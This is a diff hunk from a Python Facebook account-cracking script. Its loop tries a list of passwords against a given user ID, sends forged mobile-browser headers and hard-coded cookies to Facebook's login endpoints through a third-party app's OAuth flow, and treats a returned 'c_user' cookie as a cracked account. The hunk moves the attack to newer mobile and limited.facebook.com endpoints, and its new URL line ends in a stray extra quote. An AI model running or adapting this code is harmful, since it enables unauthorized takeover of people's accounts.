@@ -1402,59 +1402,47 @@ def x(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
+            free_fb = Session.get('https://m.facebook.com/').text
             data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '3',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0^%^3D',
-            'lgnrnd': '215315_O_0g',
-            'lgnjs': '1735192396',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
-            'had_password_prefilled': 'true',
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVqq^%^2FV^%^2FAAAAAFAC',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            'next': 'https://m.facebook.com/v3.2/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback&scope=email&state=https%3A%2F%2Fpixlr.com%2F&client_id=144117062837799&ret=login&fbapp_pres=0&logger_id=27279048-2ffa-4266-a587-1693d6522204&tp=unspecified',
+            'flow': 'login_no_pin',
+            'pass': pw,
+            'login': 'Log in'}
             cookies = {
-            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnbO9L.AWXC-uraSgc',
-            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
-            'ps_l': '1',
-            'ps_n': '1',
-            'wd': '1440x402',
-            'usida': 'eyJ2ZXIiOjEsImlkIjoiQXNwMzZ6NXI0YzBkNiIsInRpbWUiOjE3MzUxOTIzMzd9',
-            'locale': 'hi_IN',}
+            'datr': 'uAXXaK1gpNPg1O65HG_ozwZ7',
+            'sb': 'uAXXaOSXHTmtpCn0gqXqAtKu',
+            'm_pixel_ratio': '2.4749999046325684',
+            'wd': '437x973',
+            'fr': '0hQzCLwErgpENEQsZ..Bo1wW4..AAA.0.0.Bo153r.AWeRXRzZmHeYbFttkxxk2EeXpew',}
             headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.5',
-            'Referer': 'https://hi-in.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTkyMzYyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ^%^3D^%^3D&next',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://hi-in.facebook.com',
-            'DNT': '1',
-            'Alt-Used': 'hi-in.facebook.com',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1',
-            'Priority': 'u=0, i',
-            'Pragma': 'no-cache',
-            'Cache-Control': 'no-cache',}
+            'authority': 'm.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '2.75',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=144117062837799&kid_directed_site=0&app_id=144117062837799&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23128PC33I"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"13"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 5; 23128PC33I Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4795.108 Mobile Safari/537.36',
+            'viewport-width': '393',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            url = 'https://limited.facebook.com/login/device-based/login/async/?api_key=144117062837799&auth_token=e1ae613468f81a1ddb383ce1126a88ad&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26cbt%3D1758961130901%26logger_id%3Da2421e03-bf3c-4a1c-b571-941d1bab12f6&refsrc=deprecated&app_id=144117062837799&cancel=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied&lwv=100''
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
